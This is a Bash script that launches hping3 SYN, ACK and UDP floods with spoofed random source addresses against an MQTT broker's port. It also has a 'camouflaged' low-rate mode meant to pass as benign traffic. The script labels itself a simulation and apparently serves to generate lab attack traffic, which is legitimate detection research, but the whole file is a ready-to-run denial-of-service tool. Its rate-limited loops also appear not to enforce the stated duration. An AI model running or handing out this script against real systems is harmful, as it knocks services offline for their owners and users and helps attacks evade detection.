#!/bin/bash

# Usage:
# ./ddos_hping3.sh <target_ip> <duration_sec> <mode> <rate>
# mode: syn | ack | udp | camo
# rate: packets per second for flood modes (ignored for camo)
#
# Examples:
# ./ddos_hping3.sh 10.0.0.2 60 syn 1000        # SYN flood 60s at ~1000pps
# ./ddos_hping3.sh 10.0.0.2 60 udp 500         # UDP flood
# ./ddos_hping3.sh 10.0.0.2 120 camo 0         # Camouflaged low-rate (benign-like)

TARGET=$1
DURATION=$2
MODE=$3
RATE=$4

PORT=1883  # MQTT default port

if [[ -z "$TARGET" || -z "$DURATION" || -z "$MODE" ]]; then
  echo "Usage: $0 <target_ip> <duration_sec> <mode: syn|ack|udp|camo> <rate>"
  exit 1
fi

end_time=$(( $(date +%s) + DURATION ))

echo "[*] Starting DDoS simulation: target=$TARGET mode=$MODE duration=${DURATION}s rate=$RATE"

case "$MODE" in
  syn)
    # TCP SYN flood to MQTT port
    # -S: SYN, --flood: send as fast as possible, -p port
    # use -i u$interval to control approximate rate if RATE given
    if [[ "$RATE" -gt 0 ]]; then
      # interval in microseconds: 1e6 / RATE
      interval=$((1000000 / RATE))
      echo "[*] SYN flood at approx $RATE pps (interval ~${interval}us)"
      while [[ $(date +%s) -lt $end_time ]]; do
        hping3 -S -p $PORT -i u${interval} --rand-source $TARGET > /dev/null 2>&1
      done
    else
      echo "[*] SYN flood full blast"
      hping3 -S -p $PORT --flood --rand-source $TARGET
    fi
    ;;
  ack)
    # TCP ACK flood (less common but noisy)
    if [[ "$RATE" -gt 0 ]]; then
      interval=$((1000000 / RATE))
      echo "[*] ACK flood at approx $RATE pps (interval ~${interval}us)"
      while [[ $(date +%s) -lt $end_time ]]; do
        hping3 -A -p $PORT -i u${interval} --rand-source $TARGET > /dev/null 2>&1
      done
    else
      echo "[*] ACK flood full blast"
      hping3 -A -p $PORT --flood --rand-source $TARGET
    fi
    ;;
  udp)
    # UDP flood to MQTT port (though MQTT is TCP; for noise)
    if [[ "$RATE" -gt 0 ]]; then
      interval=$((1000000 / RATE))
      echo "[*] UDP flood at approx $RATE pps (interval ~${interval}us)"
      while [[ $(date +%s) -lt $end_time ]]; do
        hping3 --udp -p $PORT -i u${interval} --rand-source $TARGET > /dev/null 2>&1
      done
    else
      echo "[*] UDP flood full blast"
      hping3 --udp -p $PORT --flood --rand-source $TARGET
    fi
    ;;
  camo)
    # Camouflaged low-rate attack: gửi burst nhỏ theo phân phối giống benign
    # Ví dụ: mỗi 10s gửi 5 packet, window = 10, giống traffic nhẹ
    echo "[*] Camouflaged low-rate attack (benign-like)"
    # parameters you can tune:
    SLOT=5          # số giây một slot
    BURST=5         # số packet mỗi slot
    while [[ $(date +%s) -lt $end_time ]]; do
      for ((i=0;i<BURST;i++)); do
        hping3 -S -p $PORT -c 1 $TARGET > /dev/null 2>&1
        sleep 0.1  # small spacing within burst
      done
      sleep ${SLOT}
    done
    ;;
  *)
    echo "Unknown mode: $MODE. Use syn|ack|udp|camo"
    exit 1
    ;;
esac

echo "[*] DDoS simulation finished."
